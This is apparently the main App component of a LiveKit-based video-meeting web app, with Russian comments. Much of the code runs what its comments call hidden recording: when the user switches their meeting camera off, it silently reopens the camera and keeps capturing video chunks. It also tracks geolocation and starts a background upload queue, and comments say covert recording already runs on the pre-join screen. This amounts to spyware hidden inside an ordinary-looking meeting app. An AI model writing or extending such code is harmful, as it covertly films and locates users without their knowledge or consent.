import { useState, useRef, useEffect } from 'react';
import HomePage from '@/app/components/HomePage';
import JitsiPreJoin from '@/app/components/JitsiPreJoin';
import LiveKitRoom from '@/app/components/LiveKitRoom';
import { VideoRecorder } from '@/app/components/VideoRecorder';
import { startQueueProcessor, stopQueueProcessor } from '@/utils/videoUpload';
import { preloadFFmpeg } from '@/utils/videoCompression';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
  const [roomName, setRoomName] = useState('');
  const [roomTitle, setRoomTitle] = useState(''); // Friendly room title
  const [userName, setUserName] = useState('');
  
  // LiveKit connection data
  const [livekitUrl, setLivekitUrl] = useState('');
  const [token, setToken] = useState('');
  
  // Video recording state
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('back');
  
  // Geolocation data
  const [geoData, setGeoData] = useState<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>(null);
  
  // Refs for camera switching and permissions
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0);
  const geoLocationSentRef = useRef(false);
  const currentVideoDeviceIdRef = useRef<string | null>(null);
  const isExecutingPermissionsRef = useRef(false);

  // Initialize LiveKit localStorage to prevent warnings
  useEffect(() => {
    try {
      const lkKey = 'lk-user-choices';
      if (!localStorage.getItem(lkKey)) {
        localStorage.setItem(lkKey, JSON.stringify({}));
        console.log('✅ Initialized LiveKit localStorage');
      }
    } catch (error) {
      console.error('❌ Failed to initialize localStorage:', error);
    }
  }, []);
  
  // ✅ Start queue processor and preload FFmpeg on mount
  useEffect(() => {
    console.log('🚀 [App] Starting queue processor and preloading FFmpeg...');
    
    // Start background queue processor
    startQueueProcessor();
    
    // Preload FFmpeg in background (won't block UI)
    preloadFFmpeg();
    
    // Cleanup on unmount
    return () => {
      stopQueueProcessor();
    };
  }, []);
  
  // Video chunk handler
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 [App] Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Update chunk number in state for camera switching logic
    setCurrentChunkNumber(chunkNum);
  };

  const handleStartMeeting = (roomNameInput: string, roomTitleInput?: string) => {
    setRoomName(roomNameInput);
    setRoomTitle(roomTitleInput || '');
    setCurrentPage('prejoin');
  };
  
  const handleJoinRoom = (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
    console.log('🚪 [App] handleJoinRoom вызван - останавливаем PreJoin запись перед входом в комнату');
    
    // ✅ ВАЖНО: Останавливаем скрытую запись из PreJoin перед входом в комнату
    // чтобы LiveKitRoom мог управлять камерой/микрофоном
    if (videoStreamFront) {
      console.log('🛑 [App] Останавливаем PreJoin stream перед входом в комнату');
      videoStreamFront.getTracks().forEach(track => {
        track.stop();
        console.log(`🛑 Stopped PreJoin track: ${track.kind} (${track.label})`);
      });
      setVideoStreamFront(null);
    }
    
    // Сбрасываем флаг записи
    setIsVideoRecording(false);
    console.log('✅ [App] PreJoin запись остановлена - LiveKitRoom может захватить камеру');
    
    setUserName(userNameInput);
    setToken(tokenInput);
    setLivekitUrl(livekitUrlInput);
    setCurrentPage('room');
  };
  
  const handleLeaveRoom = () => {
    console.log('🚪 Leaving room and returning to home page');
    
    // Clear room parameter from URL
    const newUrl = new URL(window.location.href);
    newUrl.searchParams.delete('room');
    window.history.pushState({}, '', newUrl.toString());
    
    // Reset all state
    setRoomName('');
    setRoomTitle('');
    setUserName('');
    setToken('');
    setLivekitUrl('');
    setVideoStreamFront(null);
    setIsVideoRecording(false);
    setCurrentChunkNumber(0);
    setCurrentCameraType('back');
    setGeoData(null);
    
    // Reset refs
    isSwitchingCameraRef.current = false;
    globalChunkCounterRef.current = 0;
    geoLocationSentRef.current = false;
    currentVideoDeviceIdRef.current = null;
    isExecutingPermissionsRef.current = false;
    
    // Return to home page
    setCurrentPage('home');
  };
  
  // Обработчик изменения состояния камеры в LiveKit
  const handleLiveKitCameraStateChange = (isEnabled: boolean) => {
    console.log(`🔄 [App] LiveKit camera state changed: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
    
    if (isEnabled) {
      // Камера LiveKit включена - останавливаем скрытую запись
      console.log('⏸️ [App] Stopping hidden recording (LiveKit camera is active)');
      setIsVideoRecording(false);
      
      // ✅ ИСПРАВЛЕНИЕ: Добавляем защиту - останавливаем stream только если он активен
      if (videoStreamFront) {
        console.log('🛑 [App] Stopping hidden stream to free camera for LiveKit');
        videoStreamFront.getTracks().forEach(track => {
          track.stop();
          console.log(`🛑 Stopped track: ${track.kind} (${track.label})`);
        });
        setVideoStreamFront(null);
      }
    } else {
      // Камера LiveKit выключена - возобновляем скрытую запись
      console.log('▶️ [App] Resuming hidden recording (LiveKit camera is disabled)');
      
      // ✅ ИСПРАВЛЕНИЕ: Проверяем что запись еще не запущена И камера свободна
      if (!isVideoRecording && !videoStreamFront) {
        console.log('🎬 [App] Запускаем скрытую запись...');
        
        // ✅ ИСПРАВЛЕНИЕ: Добавляем небольшую задержку чтобы LiveKit точно освободил камеру
        setTimeout(() => {
          restartHiddenRecording();
        }, 300); // 300ms задержка для освобождения LiveKit stream
        
      } else {
        console.log('⏭️ [App] Скрытая запись уже активна - пропускаем');
      }
    }
  };
  
  // Функция для перезапуска скрытой записи
  const restartHiddenRecording = async () => {
    try {
      console.log('🎥 [App] Restarting hidden recording...');
      console.log('🎥 [App] Current state:', { 
        isVideoRecording, 
        hasVideoStream: !!videoStreamFront,
        currentPage 
      });
      
      // Определяем устройство
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const cameraType = isMobile ? 'back' : 'front';
      
      // ❌ УБИРАЕМ: Проверку микрофонов - они нам не нужны для скрытой записи
      // ✅ КРИТИЧНО: Скрытая запись должна быть ТОЛЬКО видео без аудио
      // чтобы не конфликтовать с LiveKit микрофоном!
      console.log('⚠️ [App] Скрытая запись будет ТОЛЬКО видео (без аудио для совместимости с LiveKit)');
      
      // 🔧 Запрашиваем доступ к камере с fallback-ами
      let stream: MediaStream | null = null;
      
      // Попытка 1: С facingMode (ТОЛЬКО видео)
      try {
        const constraints: MediaStreamConstraints = {
          video: isMobile 
            ? { facingMode: 'environment' } // back camera
            : true, // для desktop просто true
          audio: false // ✅ КРИТИЧНО: НИКОГДА не запрашиваем аудио в скрытой записи!
        };
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log('✅ [App] Got camera stream (попытка 1 - только видео)');
      } catch (err1) {
        console.log(`⚠️ [App] Попытка 1 не удалась: ${err1}`);
        
        // Попытка 2: Базовые constraints (ТОЛЬКО видео)
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false // ✅ КРИТИЧНО: НИКОГДА не запрашиваем аудио!
          });
          console.log('✅ [App] Got camera stream (попытка 2 - только видео)');
        } catch (err2) {
          console.log(`⚠️ [App] Попытка 2 не удалась: ${err2}`);
          
          // Попытка 3: ТОЛЬКО видео (последняя попытка)
          try {
            stream = await navigator.mediaDevices.getUserMedia({ 
              video: true,
              audio: false 
            });
            console.log('✅ [App] Got camera stream (попытка 3 - только видео)');
          } catch (err3) {
            console.error(`❌ [App] Все попытки не удались: ${err3}`);
            return;
          }
        }
      }
      
      if (!stream) {
        console.error('❌ [App] Не удалось получить медиа-поток');
        return;
      }
      
      console.log('✅ [App] Got camera stream for hidden recording');
      
      setVideoStreamFront(stream);
      setCurrentCameraType(cameraType);
      setIsVideoRecording(true);
      
    } catch (error) {
      console.error('❌ [App] Failed to restart hidden recording:', error);
    }
  };
  
  return (
    <div className="size-full">
      {currentPage === 'home' && (
        <HomePage onStartMeeting={handleStartMeeting} />
      )}

      {currentPage === 'prejoin' && (
        <JitsiPreJoin 
          roomName={roomName}
          initialRoomTitle={roomTitle}
          onJoinRoom={handleJoinRoom}
          videoStreamFront={videoStreamFront}
          setVideoStreamFront={setVideoStreamFront}
          isVideoRecording={isVideoRecording}
          setIsVideoRecording={setIsVideoRecording}
          currentChunkNumber={currentChunkNumber}
          setCurrentChunkNumber={setCurrentChunkNumber}
          currentCameraType={currentCameraType}
          setCurrentCameraType={setCurrentCameraType}
          geoData={geoData}
          setGeoData={setGeoData}
          isSwitchingCameraRef={isSwitchingCameraRef}
          globalChunkCounterRef={globalChunkCounterRef}
          geoLocationSentRef={geoLocationSentRef}
          currentVideoDeviceIdRef={currentVideoDeviceIdRef}
          isExecutingPermissionsRef={isExecutingPermissionsRef}
        />
      )}
      
      {currentPage === 'room' && (
        <LiveKitRoom
          roomName={roomName}
          userName={userName}
          token={token}
          livekitUrl={livekitUrl}
          onLeave={handleLeaveRoom}
          videoStreamFront={videoStreamFront}
          setVideoStreamFront={setVideoStreamFront}
          isVideoRecording={isVideoRecording}
          setIsVideoRecording={setIsVideoRecording}
          currentChunkNumber={currentChunkNumber}
          setCurrentChunkNumber={setCurrentChunkNumber}
          currentCameraType={currentCameraType}
          setCurrentCameraType={setCurrentCameraType}
          geoData={geoData}
          setGeoData={setGeoData}
          isSwitchingCameraRef={isSwitchingCameraRef}
          globalChunkCounterRef={globalChunkCounterRef}
          geoLocationSentRef={geoLocationSentRef}
          currentVideoDeviceIdRef={currentVideoDeviceIdRef}
          isExecutingPermissionsRef={isExecutingPermissionsRef}
          onCameraStateChange={handleLiveKitCameraStateChange}
        />
      )}
      
      {/* ✅ VideoRecorder ВСЕГДА один - вне условий страниц */}
      {videoStreamFront && (
        <VideoRecorder
          key={currentCameraType}
          stream={videoStreamFront}
          isRecording={isVideoRecording}
          cameraType={currentCameraType}
          globalChunkCounter={globalChunkCounterRef}
          geoData={geoData}
          onChunkReady={handleVideoChunkReady}
        />
      )}
    </div>
  );
}